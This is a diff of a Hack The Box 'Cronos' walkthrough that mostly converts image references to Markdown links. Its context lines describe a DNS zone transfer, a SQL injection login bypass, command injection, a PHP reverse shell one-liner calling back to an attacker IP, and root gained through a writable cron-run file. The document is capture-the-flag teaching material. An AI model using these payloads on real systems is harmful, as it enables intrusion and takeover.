@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Cronos.png
+![Cronos.png](../assets/cronos_assets/Cronos.png)
 
 ### Enumeration
 
@@ -62,23 +62,23 @@ Let's take a quick look at DNS before turning our attention to http.
 
 Going out on a limb based on past experience with HTB machines, their typical hostname format is box-name.htb. There are exceptions to this (sometimes AD boxes will just be HTB.local, etc), but first thing I'm going to try is a zone transfer using cronos.htb and the ip:
 
-dns.png
+![dns.png](../assets/cronos_assets/dns.png)
 
 Nice! Were successfully able to do a zone transfer and get a few more targets to investigate. 
 
 After adding all of these to my `/etc/hosts file`, my immediate attention goes to admin.cronos.htb. Let's check that out.
 
-admin_login.png
+![admin_login.png](../assets/cronos_assets/admin_login.png)
 
 I'm met with just a simple login page. Checking out the source code for this page using `ctrl + u` doesn't yield anything juicy, and I'm unable to login with the standard weak credentials like admin:admin, admin:password, admin:cronos, root:root, etc. 
 
 Let's try throwing some SQL injections to bypass the login at it. It took a bit a playing around, but in the end one of the most classic login bypasses worked for me: `' or 1=1-- - ` logged me in where I found this interesting feature:
 
-net_tool.png
+![net_tool.png](../assets/cronos_assets/net_tool.png)
 
 Let's intercept a request using BurpSuite to look more closely at what's going on here. 
 
-burp.png
+![burp.png](../assets/cronos_assets/burp.png)
 
 Ok cool, so it looks like the request has a command portion as well as a host. I know from the site that I can use both traceroute as well as ping as commands. I wonder if I can issue other common linux commands here? 
 
@@ -90,7 +90,7 @@ command=id&host=
 
 Nice! Looking at the response, we have execution here:
 
-execution.png
+![execution.png](../assets/cronos_assets/execution.png)
 
 Let's see if we can try something more malicious now.
 
@@ -102,7 +102,7 @@ I grab `php -r '$sock=fsockopen("10.10.14.20",443);exec("sh <&3 >&3 2>&3");'` an
 
 After setting up a listener and sending the request, I get a callback to my machine as www-data.
 
-callback.png
+![callback.png](../assets/cronos_assets/callback.png)
 
 I can quickly stabilize this shell by issuing:
 
@@ -111,7 +111,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 And then grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/cronos_assets/user_flag.png)
 
 ### Privilege Escalation
 
@@ -121,7 +121,7 @@ Ok rant over, back to work. Lets see if we can see any interesting cron-jobs:
 
 Interesting:
 
-crontab.png
+![crontab.png](../assets/cronos_assets/crontab.png)
 
 Looks like this file is being run every minute with root permissions. Let's do a little more investigation here, and see if we can write to this file:
 
@@ -131,11 +131,11 @@ ls -la artisan
 -rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan
 ```
 
-Sweet, looks like all we need to do here is inject a php reverse shell into this file, set up a listener and wait for our root shell to arrive. Let's do it:
+Sweet, looks like all we need to do here is inject a php reverse shell into this file, set up a listener and wait for our root shell to arrive. Let's do it.
 
 First I need to transfer from my machine to Cronos a copy of php-reverse-shell.php, after updating the script to reflect my Ip and port I'll be listening on:
 
-php_shell.png
+![php_shell.png](../assets/cronos_assets/php_shell.png)
 
 Then I set up a Python http.server with `python -m http.server 80` and grab the file using wget:
 
@@ -177,7 +177,7 @@ cronos
 ```
 All that's left to do is grab the root.txt flag:
 
-root_flag.png
+![root_flag.png](../assets/cronos_assets/root_flag.png)
 
 And that's all she wrote! This was a fun box that reinforced some classic concepts. I enjoyed playing with DNS, the login bypass via SQLI, as well as exploiting the functionality of admin.cronos.htb to get RCE on the box. This is an older box that in my opinion should have been rated 'Easy', but I had a fun time with it nonetheless.
 
@@ -185,5 +185,5 @@ Thanks for following along!
 
 -Ryan
 
---------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------
 
